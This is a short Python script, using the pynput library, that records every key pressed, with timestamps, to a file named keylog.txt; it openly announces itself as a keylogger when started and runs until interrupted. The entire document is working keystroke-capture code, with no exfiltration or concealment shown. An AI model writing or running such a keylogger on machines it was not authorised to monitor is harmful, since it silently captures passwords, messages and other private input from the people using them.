from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(f'Key pressed: {key}')

# Start the keylogger
print("Keylogger started. Press Ctrl+C to stop.")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


